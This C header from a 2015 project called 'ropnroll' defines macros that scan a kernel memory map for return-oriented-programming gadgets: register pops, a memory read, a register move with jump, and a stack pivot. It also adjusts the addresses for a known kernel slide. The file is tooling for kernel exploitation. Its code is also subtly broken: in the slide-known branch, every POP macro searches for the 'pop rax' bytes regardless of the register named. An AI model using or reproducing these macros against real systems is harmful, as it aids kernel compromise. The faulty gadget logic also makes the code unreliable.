//
//  rnr_gadgets.h
//  ropnroll_final
//
//  Created by jndok on 26/11/15.
//  Copyright © 2015 jndok. All rights reserved.
//

#ifndef rnr_gadgets_h
#define rnr_gadgets_h

#include "../ropnroll.h"
#include "../ropnroll_macros.h"

#define RNR_POP_RAX(map) kslide!=KSLIDE_UNKNOWN ? RNR_SLIDE_POINTER(locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x58, 0xC3}), 2)) : locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x58, 0xC3}), 2)
#define RNR_POP_RCX(map) kslide!=KSLIDE_UNKNOWN ? RNR_SLIDE_POINTER(locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x58, 0xC3}), 2)) : locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x59, 0xC3}), 2)
#define RNR_POP_RDX(map) kslide!=KSLIDE_UNKNOWN ? RNR_SLIDE_POINTER(locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x58, 0xC3}), 2)) : locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x5A, 0xC3}), 2)
#define RNR_POP_RBX(map) kslide!=KSLIDE_UNKNOWN ? RNR_SLIDE_POINTER(locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x58, 0xC3}), 2)) : locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x5B, 0xC3}), 2)
#define RNR_POP_RSP(map) kslide!=KSLIDE_UNKNOWN ? RNR_SLIDE_POINTER(locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x58, 0xC3}), 2)) : locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x5C, 0xC3}), 2)
#define RNR_POP_RBP(map) kslide!=KSLIDE_UNKNOWN ? RNR_SLIDE_POINTER(locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x58, 0xC3}), 2)) : locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x5D, 0xC3}), 2)
#define RNR_POP_RSI(map) kslide!=KSLIDE_UNKNOWN ? RNR_SLIDE_POINTER(locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x58, 0xC3}), 2)) : locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x5E, 0xC3}), 2)
#define RNR_POP_RDI(map) kslide!=KSLIDE_UNKNOWN ? RNR_SLIDE_POINTER(locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x58, 0xC3}), 2)) : locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x5F, 0xc3}), 2)

#define RNR_RAX_TO_RDI_POP_RBP_JMP_RCX(map) kslide!=KSLIDE_UNKNOWN ? RNR_SLIDE_POINTER(locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x48, 0x89, 0xC7, 0x5D, 0xFF, 0xE1}), 6)) : locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x48, 0x89, 0xC7, 0x5D, 0xFF, 0xE1}), 6)
#define RNR_READ_RAX_TO_RAX_POP_RBP(map) kslide!=KSLIDE_UNKNOWN ? RNR_SLIDE_POINTER(locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x48, 0x8B, 0x00, 0x5D, 0xC3}), 5)) : locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x48, 0x8B, 0x00, 0x5D, 0xC3}), 5)

#define RNR_NOP(map) kslide!=KSLIDE_UNKNOWN ? RNR_SLIDE_POINTER(locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x90, 0xC3}), 2)) : locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x90, 0xC3}), 2)

#define RNR_PIVOT_RAX(map) kslide!=KSLIDE_UNKNOWN ? RNR_SLIDE_POINTER(locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x50, 0x01, 0x00, 0x00, 0x5b, 0x41, 0x5c, 0x41, 0x5e, 0x41, 0x5F, 0x5D, 0xC3}), 13)) : locate_kernel_base(map)+locate_gadget_in_map(map, (char*)((uint8_t[]){0x50, 0x01, 0x00, 0x00, 0x5b, 0x41, 0x5c, 0x41, 0x5e, 0x41, 0x5F, 0x5D, 0xC3}), 13)

#endif /* rnr_gadgets_h */
